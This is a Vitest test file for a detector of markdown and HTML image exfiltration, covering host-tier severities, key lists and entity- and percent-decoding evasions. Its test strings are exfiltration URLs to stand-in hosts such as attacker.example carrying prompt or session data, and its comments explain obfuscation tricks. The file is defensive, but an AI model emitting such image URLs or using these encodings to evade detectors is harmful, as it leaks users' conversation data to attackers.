/**
 * S18 (v1.9.0): markdown-exfil host-tier asymmetry + weak>=1 threshold relax.
 *
 * Drives `detectMarkdownExfil` directly to pin the per-tier severity matrix:
 *
 *   tier                     | strong>=1 | weak>=1 only
 *   -------------------------+-----------+--------------
 *   imageOnlyHosts (suffix)  | SAFE      | SAFE          (isSafeHost short-circuit)
 *   userContentHosts (exact) | SAFE      | SAFE          (isSafeHost short-circuit)
 *   unknown host             | danger    | warning       <-- v1.9.0 NEW (was need weak>=2)
 *   subdomain of UC host     | danger    | warning       <-- exact-only means subdomains fall through
 *   public IP literal        | danger    | warning       <-- v1.9.0 NEW split (was danger on either)
 *   private/loopback IP      | warning   | SAFE          <-- v1.9.0 NEW silent-on-weak
 *
 * Plus:
 *   - the high-FP generic weakKeys (data / text / msg / message) were demoted
 *     to `extraGenericWeakKeys` in exfil-patterns.json and MUST NOT count
 *     toward the weak tally in the live detector.
 *   - R12: technique is a fixed phrase; host & matchedKey live on `meta.*`
 *     and never appear inside `technique`.
 *   - R13: matchLen/position bracket contract preserved.
 */

import { describe, it, expect } from "vitest";
import { detectMarkdownExfil } from "../src/markdown-exfil.js";

function one(md) {
  const out = detectMarkdownExfil(md);
  expect(out.length, `expected exactly 1 finding for: ${md}`).toBe(1);
  return out[0];
}

describe("md-exfil threshold matrix — imageOnlyHosts (Tier-1, suffix-safe)", () => {
  it("imgur with weak key -> safe (short-circuit)", () => {
    const md = `![x](https://i.imgur.com/abc.png?session=preview)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("imgur with MANY weak keys -> still safe", () => {
    const md =
      `![x](https://i.imgur.com/abc.png?session=A&chat=B&context=C&payload=D&history=E)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("imgur with strong key -> still safe (short-circuit beats all checks)", () => {
    const md = `![x](https://i.imgur.com/abc.png?prompt=ignore)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("subdomain of imageOnly host (foo.cdn.jsdelivr.net) -> safe (suffix match)", () => {
    const md = `![x](https://foo.cdn.jsdelivr.net/npm/pkg/dist/x.png?session=A)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });
});

describe("md-exfil threshold matrix — userContentHosts (Tier-2, exact-only)", () => {
  it("exact notion.so + weak key -> safe (exact match short-circuit)", () => {
    const md = `![n](https://notion.so/page/img.png?context=preview)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("subdomain attacker.notion.so + 1 weak key -> warning (NOT short-circuited)", () => {
    // userContentHosts are exact-only; subdomains fall through to the unknown
    // host path which now warns on weak>=1.
    const md = `![n](https://attacker.notion.so/page/img.png?session=abc)`;
    const f = one(md);
    expect(f.severity).toBe("warning");
    expect(f.technique).toBe("Markdown image exfiltration (weak key)");
  });

  it("subdomain attacker.notion.so + strong key -> danger", () => {
    const md = `![n](https://attacker.notion.so/page/img.png?prompt=leak)`;
    const f = one(md);
    expect(f.severity).toBe("danger");
    expect(f.technique).toBe("Markdown image exfiltration (strong key)");
  });
});

describe("md-exfil threshold matrix — unknown host", () => {
  it("unknown host + 0 keys -> safe", () => {
    const md = `![x](http://attacker.example/p)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("unknown host + 1 weak key (v1.9.0) -> warning", () => {
    const md = `![x](http://attacker.example/p?session=hello)`;
    const f = one(md);
    expect(f.severity).toBe("warning");
    expect(f.technique).toBe("Markdown image exfiltration (weak key)");
    expect(f.meta).toMatchObject({ matchedKey: "session", weakHits: 1 });
  });

  it("unknown host + 2 weak keys -> warning (still weak-key technique)", () => {
    const md = `![x](http://attacker.example/p?session=A&context=B)`;
    const f = one(md);
    expect(f.severity).toBe("warning");
    expect(f.technique).toBe("Markdown image exfiltration (weak key)");
    expect(f.meta.weakHits).toBe(2);
  });

  it("unknown host + 1 strong key -> danger", () => {
    const md = `![x](http://attacker.example/p?prompt=PAYLOAD)`;
    const f = one(md);
    expect(f.severity).toBe("danger");
    expect(f.technique).toBe("Markdown image exfiltration (strong key)");
  });

  it("unknown host + 1 strong + many weak -> danger (strong wins)", () => {
    const md =
      `![x](http://attacker.example/p?prompt=PAYLOAD&session=A&context=B)`;
    const f = one(md);
    expect(f.severity).toBe("danger");
    expect(f.technique).toBe("Markdown image exfiltration (strong key)");
    expect(f.meta).toMatchObject({ strongHits: 1, weakHits: 2 });
  });
});

describe("md-exfil threshold matrix — public IP literal", () => {
  it("public IPv4 + 0 keys -> safe", () => {
    const md = `![x](http://203.0.113.42/c)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("public IPv4 + 1 weak key (v1.9.0 split) -> warning (was danger pre-v1.9.0)", () => {
    const md = `![x](http://203.0.113.42/c?session=abc)`;
    const f = one(md);
    expect(f.severity).toBe("warning");
    expect(f.technique).toBe("Markdown image exfiltration (public IP host)");
    expect(f.meta).toMatchObject({ ipKind: "public", matchedKey: "session" });
  });

  it("public IPv4 + 1 strong key -> danger", () => {
    const md = `![x](http://203.0.113.42/c?prompt=ignore)`;
    const f = one(md);
    expect(f.severity).toBe("danger");
    expect(f.technique).toBe("Markdown image exfiltration (public IP host)");
  });

  it("public IPv6 + 1 weak key -> warning", () => {
    const md = `![x](http://[2001:db8::1]/c?session=abc)`;
    const f = one(md);
    expect(f.severity).toBe("warning");
    expect(f.technique).toBe("Markdown image exfiltration (public IP host)");
    expect(f.meta.host).toBe("2001:db8::1"); // brackets stripped
  });
});

describe("md-exfil threshold matrix — private/loopback IP literal", () => {
  it("private 10.x + 1 weak key (v1.9.0) -> SILENT (was warning pre-v1.9.0)", () => {
    const md = `![x](http://10.0.0.1/c?session=abc)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("private 172.16.x + 1 weak key -> silent", () => {
    const md = `![x](http://172.16.5.5/c?context=abc)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("private 192.168.x + 1 weak key -> silent", () => {
    const md = `![x](http://192.168.1.10/c?session=abc)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("loopback 127.0.0.1 + 1 weak key -> silent", () => {
    const md = `![x](http://127.0.0.1/c?session=abc)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("loopback ::1 + 1 weak key -> silent (IPv6 mirror)", () => {
    const md = `![x](http://[::1]/c?session=abc)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("private + 1 strong key -> warning (still surfaced — strong matters here)", () => {
    const md = `![x](http://192.168.1.10/c?prompt=ignore)`;
    const f = one(md);
    expect(f.severity).toBe("warning");
    expect(f.technique).toBe("Markdown image exfiltration (private IP host)");
    expect(f.meta).toMatchObject({ ipKind: "private", matchedKey: "prompt" });
  });

  it("loopback ::1 + 1 strong key -> warning", () => {
    const md = `![x](http://[::1]/c?prompt=ignore)`;
    const f = one(md);
    expect(f.severity).toBe("warning");
    expect(f.technique).toBe("Markdown image exfiltration (private IP host)");
  });
});

describe("md-exfil — high-FP generic weak keys demoted (v1.9.0)", () => {
  it("'data' alone is no longer weak — silent", () => {
    const md = `![x](http://attacker.example/p?data=hello)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("'text' alone is no longer weak — silent", () => {
    const md = `![x](http://attacker.example/p?text=Placeholder)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("'msg' alone is no longer weak — silent", () => {
    const md = `![x](http://attacker.example/p?msg=hello)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("'message' alone is no longer weak — silent", () => {
    const md = `![x](http://attacker.example/p?message=hi)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("real weak key ('context') still counts — warning", () => {
    const md = `![x](http://attacker.example/p?context=hello)`;
    const f = one(md);
    expect(f.severity).toBe("warning");
    expect(f.meta.matchedKey).toBe("context");
  });

  it("demoted key + real weak key -> still weak=1 (demoted key not counted)", () => {
    // data is demoted, session is weak. weakHits should be 1, not 2.
    const md = `![x](http://attacker.example/p?data=A&session=B)`;
    const f = one(md);
    expect(f.severity).toBe("warning");
    expect(f.meta.weakHits).toBe(1);
    expect(f.meta.matchedKey).toBe("session");
  });
});

describe("md-exfil — R12/R13 invariants preserved under new thresholds", () => {
  it("R12: weak-key technique never embeds attacker host or key name", () => {
    const md = `![x](http://evil-host.example/c?session=PAYLOAD-STR)`;
    const f = one(md);
    expect(f.technique).not.toContain("evil-host.example");
    expect(f.technique).not.toContain("PAYLOAD-STR");
    expect(f.technique).not.toContain("session");
    expect(f.meta.host).toBe("evil-host.example");
    expect(f.meta.matchedKey).toBe("session");
  });

  it("R12: public-IP weak-key technique stays fixed-phrase", () => {
    const md = `![x](http://203.0.113.42/c?session=PAYLOAD)`;
    const f = one(md);
    expect(f.technique).toBe("Markdown image exfiltration (public IP host)");
    expect(f.technique).not.toContain("203.0.113.42");
    expect(f.technique).not.toContain("session");
  });

  it("R13: position+matchLen still slice back to the URL exactly (weak path)", () => {
    const url = "http://attacker.example/p?session=hello";
    const md = `![alt](${url})`;
    const f = one(md);
    expect(md.slice(f.position, f.position + f.matchLen)).toBe(url);
  });

  it("R13: position+matchLen slice contract holds for public-IP weak path", () => {
    const url = "http://203.0.113.42/c?session=abc";
    const md = `![alt](${url})`;
    const f = one(md);
    expect(md.slice(f.position, f.position + f.matchLen)).toBe(url);
  });
});

// ---- S4 v1.10.0 Theme A: 3-path parity matrix ------------------------------
//
// The detector runs four passes (ref-def collection + inline image + ref image
// + html-img). Each pass goes through the SAME classifyUrl() pipeline, so the
// host-tier verdict for a given URL must be path-independent: the same URL
// written in any of the three image syntaxes must produce identical
// {severity, technique, meta.host, meta.matchedKey}. This matrix pins that
// cross-path consistency so a future refactor (e.g. moving classifyUrl per-
// pass instead of shared) cannot silently introduce path-dependent severity
// drift. R20 host-tier asymmetry is therefore guaranteed in all three surfaces
// rather than just inline.
//
// Two extra pins ride along:
//   * unresolved reference ids must NOT produce findings (no fallback URL).
//   * for reference images the `position` anchor points at the definition
//     line's URL start (NOT the use-site `![alt][ref]`), preserving the
//     slice(position, position+matchLen) === url bracket contract.

describe("S4: 3-path parity matrix (inline / ref-image / html-img)", () => {
  // Each entry exercises the same URL through all three syntaxes and asserts
  // identical classifyUrl() output across the paths.
  const matrix = [
    {
      label: "strong-key unknown host -> danger",
      url: "http://attacker.example/?prompt=PAYLOAD",
      expect: {
        severity: "danger",
        technique: "Markdown image exfiltration (strong key)",
        host: "attacker.example",
        matchedKey: "prompt",
      },
    },
    {
      label: "weak-key only unknown host -> warning",
      url: "http://attacker.example/?session=hello",
      expect: {
        severity: "warning",
        technique: "Markdown image exfiltration (weak key)",
        host: "attacker.example",
        matchedKey: "session",
      },
    },
    {
      label: "public IPv4 + weak -> warning (public IP host)",
      url: "http://203.0.113.42/c?session=abc",
      expect: {
        severity: "warning",
        technique: "Markdown image exfiltration (public IP host)",
        host: "203.0.113.42",
        matchedKey: "session",
      },
    },
    {
      label: "private IPv4 + strong -> warning (private IP host)",
      url: "http://192.168.1.10/c?prompt=ignore",
      expect: {
        severity: "warning",
        technique: "Markdown image exfiltration (private IP host)",
        host: "192.168.1.10",
        matchedKey: "prompt",
      },
    },
  ];

  for (const row of matrix) {
    it(`parity: ${row.label}`, () => {
      const inlineMd = `![alt](${row.url})`;
      const refMd = `![alt][r]\n\n[r]: ${row.url}`;
      const htmlMd = `<img src="${row.url}" />`;

      const inlineFs = detectMarkdownExfil(inlineMd);
      const refFs = detectMarkdownExfil(refMd);
      const htmlFs = detectMarkdownExfil(htmlMd);

      expect(inlineFs).toHaveLength(1);
      expect(refFs).toHaveLength(1);
      expect(htmlFs).toHaveLength(1);

      const inline = inlineFs[0];
      const ref = refFs[0];
      const html = htmlFs[0];

      // Element tags differ per path (this is the only intended difference).
      expect(inline.element).toBe("md-image");
      expect(ref.element).toBe("md-image-ref");
      expect(html.element).toBe("html-img");

      // Severity / technique / meta.host / meta.matchedKey must be identical
      // across the three paths — classifyUrl() is shared.
      for (const f of [inline, ref, html]) {
        expect(f.severity).toBe(row.expect.severity);
        expect(f.technique).toBe(row.expect.technique);
        expect(f.meta.host).toBe(row.expect.host);
        expect(f.meta.matchedKey).toBe(row.expect.matchedKey);
      }
    });
  }

  it("parity: safe host (i.imgur.com suffix) silent across all 3 paths", () => {
    // imageOnlyHost short-circuit must apply uniformly — no path may "leak"
    // a finding on a safe host even with a strong key in the query.
    const url = "https://i.imgur.com/abc.png?prompt=ignore";
    expect(detectMarkdownExfil(`![alt](${url})`)).toEqual([]);
    expect(detectMarkdownExfil(`![alt][r]\n\n[r]: ${url}`)).toEqual([]);
    expect(detectMarkdownExfil(`<img src="${url}" />`)).toEqual([]);
  });

  it("unresolved reference id produces no finding", () => {
    // ![alt][undefined-ref] has no matching `[undefined-ref]: <url>`
    // definition, so the ref-image pass must skip silently (no fallback to
    // alt-text URL guessing).
    const md = `![alt][undefined-ref]`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("ref-image: position anchors at definition-line URL start (NOT use-site)", () => {
    // The use-site `![alt][ref]` and the definition `[ref]: <url>` are at
    // different offsets and have different lengths than the URL itself.
    // Per the (position, matchLen=url.length) bracket contract, position must
    // point inside the definition line so the slice round-trips to the URL.
    const url = "http://attacker.example/?prompt=leak";
    const md = `![alt][ref]\n\n[ref]: ${url}`;
    const fs = detectMarkdownExfil(md);
    expect(fs).toHaveLength(1);
    const f = fs[0];
    expect(f.element).toBe("md-image-ref");
    expect(f.matchLen).toBe(url.length);
    // Bracket contract: definition-line slice must equal the URL exactly.
    expect(md.slice(f.position, f.position + f.matchLen)).toBe(url);
    // Belt-and-braces: ensure position is past the use-site `![alt][ref]`,
    // i.e. anchored on the definition line, not the use-site.
    const useSiteEnd = md.indexOf("\n");
    expect(f.position).toBeGreaterThan(useSiteEnd);
  });
});

// ---- v1.12.0 Theme C: HTML img edge cases (negative pins) -----------------
//
// These pin three input shapes that are currently *silent* in detectMarkdown
// Exfil(), so a future refactor (e.g. an HTML-entity-decoding pre-pass on
// <img src=...> tokens, or a multiline-tolerant bare-src token) can't
// accidentally start surfacing findings — or, conversely, regress and stop
// noticing once we *do* harden these surfaces.
//
// Each case is a negative assert (length === 0). Comments on each it explain
// WHY the input is silent today so that when the assertion eventually flips
// (intentional hardening), the next maintainer knows what changed.
describe("HTML img edge cases (v1.12.0 Theme C) — currently silent negative pins", () => {
  it("entity-encoded quotes around src URL -> 1 warning (v1.13.0 entity decode flip)", () => {
    // v1.12.0 left this case SILENT and pinned the silence as a negative
    // test. v1.13.0 flips it: HTML attribute values are entity-decoded by
    // the browser before fetch, so `&quot;…&quot;`-wrapped URLs still
    // successfully exfiltrate. detectMarkdownExfil now mirrors that:
    // entity-decoded src is reclassified, surrounding `"` / `'` characters
    // are stripped, and the resulting URL goes through classifyUrl().
    // meta.entityDecoded === true marks the path.
    const md = `<img src=&quot;https://attacker.example/p?session=A&quot;>`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("warning");
    expect(out[0].element).toBe("html-img");
    expect(out[0].technique).toBe("Markdown image exfiltration (weak key)");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "session",
      entityDecoded: true,
    });
  });

  it("newline inside bare (unquoted) src token -> silent (token stops at \\n)", () => {
    // Bare-src token is `[^\s>'"]+` (RE_HTML_IMG group 3). Whitespace —
    // including `\n` — terminates the token, so `<img src=https://attacker
    // .example\n/p?session=A>` captures only `https://attacker.example`
    // for the src value. That URL has no query keys, so classifyUrl()
    // returns null and the finding is suppressed.
    //
    // NOTE (future): if we add a multiline-tolerant bare-src tokenizer,
    // this assert will flip. Update accordingly and re-check that the
    // post-`\n` query string is still attributed to the same host.
    const md = `<img src=https://attacker.example\n/p?session=A>`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("circular reference definition `[a]: [a]` -> silent and does NOT infinite-loop", () => {
    // RE_REF_DEF captures `[a]: [a]` as id="a" / url="[a]". `[a]` is not
    // an http(s) URL — `new URL("[a]")` throws — so classifyUrl() returns
    // null and the finding is suppressed. The use-site `![a][a]` resolves
    // its ref id to the same (silent) definition, so no finding either
    // way. Crucially, the detector does NOT re-resolve URL values as ref
    // ids, so a self-referential definition cannot loop.
    //
    // We bound the call to a 100ms wall-clock budget so a future ref-def
    // resolver that *does* recurse can't silently lock the test runner.
    const md = `![a][a]\n\n[a]: [a]`;
    const start = Date.now();
    const out = detectMarkdownExfil(md);
    const elapsed = Date.now() - start;
    expect(out).toEqual([]);
    expect(elapsed).toBeLessThan(100);
  });
});

// ---- v1.13.0: HTML img entity-decoded src ---------------------------------
//
// Browsers entity-decode HTML attribute values BEFORE fetching them, so an
// attacker can hide an exfiltration URL behind entity-encoded quote chars
// (`&quot;…&quot;`) or hide `&` query separators behind `&amp;` and still
// land payloads. The detector now mirrors that behaviour on the html-img
// path only. Inline `![alt](url)` and reference-image paths are NOT
// entity-decoded — CommonMark doesn't decode entities inside URL parens,
// and benign Markdown freely contains `&amp;` in surrounding text. The
// existing matrix and benign corpora remain untouched.
describe("HTML img entity-decoded src (v1.13.0)", () => {
  it("(a) &quot;-wrapped URL -> 1 warning, meta.entityDecoded=true", () => {
    // bare-src group 3 captures the entire `&quot;https://...&quot;` token.
    // raw classifyUrl fails (protocol `&quot;https`), then decode + strip
    // surrounding `"` -> https://attacker.example/p?session=A -> warning.
    const md = `<img src=&quot;https://attacker.example/p?session=A&quot;>`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("warning");
    expect(out[0].technique).toBe("Markdown image exfiltration (weak key)");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "session",
      entityDecoded: true,
    });
  });

  it("(b) numeric entity &#34; (decimal quote) -> same as &quot;", () => {
    // `&#34;` is the decimal numeric form of `"`. Decoder must handle it.
    const md = `<img src=&#34;https://attacker.example/p?session=A&#34;>`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("warning");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "session",
      entityDecoded: true,
    });
  });

  it("(c) hex entity &#x22; (hex quote) -> same as &quot;", () => {
    // `&#x22;` is the hex numeric form of `"`. Decoder must handle it.
    const md = `<img src=&#x22;https://attacker.example/p?session=A&#x22;>`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("warning");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "session",
      entityDecoded: true,
    });
  });

  it("(d) &amp; separator with strong key only post-decode -> danger", () => {
    // raw URL parses but searchParams yields keys `safekey` (off-list) and
    // `amp;prompt` (off-list). 0 strong / 0 weak -> raw verdict is null.
    // Decoded: `?safekey=A&prompt=B` -> 1 strong -> danger. entityDecoded=true
    // marks the path. Quote-style attribute, no surrounding-quote strip.
    const md = `<img src="http://attacker.example/p?safekey=A&amp;prompt=B">`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].technique).toBe("Markdown image exfiltration (strong key)");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "prompt",
      entityDecoded: true,
    });
  });

  it("(e) &amp; separator with weak key only post-decode -> warning", () => {
    // Same shape as (d) but the post-decode key is weak (session) — verdict
    // demotes to warning. Pins that &amp;-decoded weak path still flows
    // through the host-tier matrix (unknown-host weak>=1 = warning).
    const md = `<img src="http://attacker.example/p?safekey=A&amp;session=B">`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("warning");
    expect(out[0].technique).toBe("Markdown image exfiltration (weak key)");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "session",
      entityDecoded: true,
    });
  });

  it("(f) &amp; separator on safe host (i.imgur.com) -> SAFE post-decode", () => {
    // Critical safety net: safe-host short-circuit must apply on the decoded
    // form too. i.imgur.com is imageOnly Tier-1 — even with strong keys
    // post-decode, classifyUrl returns null before any key counting.
    // Order matters: if we host-checked BEFORE decoding `&amp;`, this would
    // still pass; but the attacker-host test (d/e) would also need to
    // decode. Pinning safe-host here locks the decode-then-classifyUrl
    // pipeline.
    const md = `<img src="https://i.imgur.com/abc.png?session=A&amp;chat=B&amp;context=C">`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("(g) R12: technique stays fixed-phrase on entity-decoded path", () => {
    // Entity-decoded findings still use one of the 4 fixed-phrase technique
    // strings — never the decoded URL, host, or key name. priority.js#labelFor
    // reads `technique` into the banner, so embedding decoded text there
    // would let the attacker steer the summary surface.
    const md = `<img src=&quot;http://evil-decoded.example/c?session=PAYLOAD&quot;>`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    const f = out[0];
    const allowed = new Set([
      "Markdown image exfiltration (strong key)",
      "Markdown image exfiltration (weak key)",
      "Markdown image exfiltration (public IP host)",
      "Markdown image exfiltration (private IP host)",
    ]);
    expect(allowed.has(f.technique)).toBe(true);
    expect(f.technique).not.toContain("evil-decoded.example");
    expect(f.technique).not.toContain("PAYLOAD");
    expect(f.technique).not.toContain("session");
    expect(f.technique).not.toContain("&quot;");
    expect(f.meta.host).toBe("evil-decoded.example");
    expect(f.meta.entityDecoded).toBe(true);
  });

  it("(h) R13: slice(position, position+matchLen) returns RAW src token (NOT decoded URL)", () => {
    // Bracket contract: position+matchLen always anchors on the raw src
    // token captured by RE_HTML_IMG, never on the decoded URL. The slice
    // round-trips to the entity-encoded form so the byte-offset surface
    // (redaction tools etc) sees exactly what was in `content`.
    const rawSrc = `&quot;http://attacker.example/p?session=A&quot;`;
    const md = `<img src=${rawSrc}>`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    const f = out[0];
    expect(f.matchLen).toBe(rawSrc.length);
    expect(md.slice(f.position, f.position + f.matchLen)).toBe(rawSrc);
    // `content` echoes the raw token (escapeForDisplay normalises to <=300
    // chars), so the displayed body matches the raw entity-encoded form too.
    // R12: decoded URL never appears in content.
    expect(f.content).not.toContain("attacker.example/p?session=A\"");
  });

  it("inline ![alt](url) with &amp; is NOT entity-decoded (CommonMark scope)", () => {
    // Inline parens URLs are NOT entity-decoded — CommonMark spec does not
    // decode entities inside `()`, and benign markdown freely contains
    // `&amp;`. The raw URL parses, searchParams yields `prompt=A` (strong)
    // and `amp;leak=B` (off-list). 1 strong -> danger via raw path only.
    // entityDecoded MUST be absent.
    const md = `![x](http://attacker.example/p?prompt=A&amp;leak=B)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].technique).toBe("Markdown image exfiltration (strong key)");
    expect(out[0].meta.entityDecoded).toBeUndefined();
  });

  it("raw URL that already classifies is NOT marked entityDecoded", () => {
    // Sanity: a normal `<img src="…?prompt=X">` (no entity present) takes
    // the raw fast path. meta.entityDecoded must NOT be set — only the
    // decoded path adds it.
    const md = `<img src="http://attacker.example/p?prompt=A">`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].meta.entityDecoded).toBeUndefined();
  });
});

// ---- v1.15.0 Theme B: percent-decoded URL pre-pass --------------------------
//
// Browsers and the WHATWG URL parser treat percent-encoded reserved chars in
// path/query as literal bytes — but our STRONG_KEYS / WEAK_KEYS lookup matches
// keys verbatim, so an attacker who writes `?%70rompt=…` (encoded 'p') hides
// the strong key from the raw classifier even though the URL fetches just fine.
// classifyUrl() now runs a minimal percent-decode pre-pass (allowlist of 6
// reserved chars) when the raw form misses, and the verdict is marked with
// meta.percentDecoded=true. The pass applies to ALL 3 image shapes uniformly.
//
// Composable with v1.13.0 entity-decode on the html-img path (both flags can
// be true for the &quot;…%70rompt… double-obfuscation shape).
//
// Allowlist: %2F / %3F / %26 / %3D / %23 / %20 (case-insensitive hex). %25
// (`%`) is EXCLUDED to prevent double-decode bypass.
describe("md-exfil percent-decoded URL — v1.15.0 Theme B", () => {
  it("(a) inline image with %70rompt -> danger via URLSearchParams native percent-decode", () => {
    // WHATWG URLSearchParams natively percent-decodes ALL bytes in the key
    // name during parsing, so `?%70rompt=…` is seen as key "prompt" without
    // any pre-pass help. This case takes the FAST PATH (raw classify hits)
    // and meta.percentDecoded is therefore UNDEFINED — our 2-pass pre-shell
    // never runs because the raw verdict is non-null.
    //
    // The pre-pass is needed for RESERVED chars (the 6 in the allowlist)
    // because URLSearchParams uses literal `&` / `=` to tokenize BEFORE
    // percent-decoding values. Hiding the separator with `%26` is what
    // bypasses raw classification — covered in (b) / (c) below.
    const md = `![x](http://attacker.example/p?%70rompt=PAYLOAD)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].meta).toMatchObject({ matchedKey: "prompt" });
    // Fast-path hit: percentDecoded flag NOT set on raw-classification hits.
    expect(out[0].meta.percentDecoded).toBeUndefined();
  });

  it("(b) inline image with ?a=A%26prompt=B (encoded & splits query, exposing prompt) -> danger", () => {
    // Raw URL: searchParams sees a single key "a" with value "A&prompt=B"
    // (since `%26` is part of the value). Off-list -> raw miss.
    // Percent-decode: `%26` -> `&` -> URL becomes `?a=A&prompt=B`, so
    // searchParams now sees `a` + `prompt`. 1 strong -> danger.
    const md = `![x](http://attacker.example/p?a=A%26prompt=B)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].technique).toBe("Markdown image exfiltration (strong key)");
    expect(out[0].element).toBe("md-image");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "prompt",
      percentDecoded: true,
    });
    // R13 bracket contract: slice round-trips to the RAW (still encoded) URL.
    const url = `http://attacker.example/p?a=A%26prompt=B`;
    expect(md.slice(out[0].position, out[0].position + out[0].matchLen)).toBe(url);
  });

  it("(c) html-img with ?a=A%26session=B (encoded & exposes weak key) -> warning", () => {
    // Same shape as (b) but the post-decode key is weak (session) — verdict
    // demotes to warning. Pins that the host-tier matrix (unknown-host
    // weak>=1 = warning) flows through the percent-decode path.
    const md = `<img src="http://attacker.example/p?a=A%26session=B">`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("warning");
    expect(out[0].technique).toBe("Markdown image exfiltration (weak key)");
    expect(out[0].element).toBe("html-img");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "session",
      percentDecoded: true,
    });
  });

  it("(d) reference-image with %26-encoded strong key on def-line -> danger", () => {
    // The ref-image path also flows through classifyUrl() — pin parity with
    // the inline path. Definition-line URL anchors position+matchLen.
    const url = `http://attacker.example/sink?safe=A%26prompt=PAYLOAD`;
    const md = `![ref][r]\n\n[r]: ${url}`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].element).toBe("md-image-ref");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "prompt",
      percentDecoded: true,
    });
    expect(md.slice(out[0].position, out[0].position + out[0].matchLen)).toBe(url);
  });

  it("(e) raw URL with un-encoded strong key -> fast-path hit, percentDecoded UNDEFINED", () => {
    // Sanity: a normal `?prompt=PAYLOAD` URL takes the raw fast path. The
    // 2-pass shell only marks meta.percentDecoded when the DECODED path
    // produced the verdict. Mirror the existing entity-decoded sanity pin.
    const md = `![x](http://attacker.example/p?prompt=PAYLOAD)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].meta.percentDecoded).toBeUndefined();
  });

  it("(f) URL with %25 (encoded percent) -> NOT double-decoded, stays silent", () => {
    // %25 is intentionally EXCLUDED from the allowlist to prevent
    // double-decode bypass (`%2525prompt` -> `%25prompt` -> `%prompt`).
    // The raw URL has `%2525prompt` as the key name (off-list), and our
    // decoder leaves `%25` untouched, so the decoded form also has
    // `%2525prompt` as the key. No finding either way.
    const md = `![x](http://attacker.example/p?%2525prompt=X)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("(g) safe-host (i.imgur.com) + %26-encoded strong key -> SAFE (short-circuit on decoded host)", () => {
    // Critical safety net: classifyUrlImpl runs isSafeHost() BEFORE
    // classifyQueryKeys(), and the hostname is identical raw vs decoded
    // (host is not percent-encoded). The decoded form still short-circuits
    // on i.imgur.com before any key counting.
    const md = `![x](https://i.imgur.com/abc.png?a=A%26prompt=PAYLOAD)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("(h) html-img: combined entity + percent encoding -> meta has BOTH entityDecoded AND percentDecoded", () => {
    // Double-obfuscation: attacker wraps the URL in &quot;…&quot; AND hides
    // the prompt key behind %26. The html-img raw classify misses (entity-
    // encoded protocol), the entity-decoded form is then re-classified via
    // classifyUrl() which itself runs the percent-decode 2-pass. The final
    // meta carries both flags.
    const md = `<img src=&quot;http://attacker.example/p?a=A%26prompt=PAYLOAD&quot;>`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].technique).toBe("Markdown image exfiltration (strong key)");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "prompt",
      entityDecoded: true,
      percentDecoded: true,
    });
  });

  it("(i) R12: technique stays fixed-phrase on percent-decoded path", () => {
    // priority.js#labelFor reads `technique` into the banner. Even on the
    // percent-decoded path the technique must be one of the 4 fixed phrases.
    // The decoded URL string must NEVER appear in technique or content.
    const md = `![x](http://evil-pct.example/c?a=A%26prompt=PAYLOAD-STR)`;
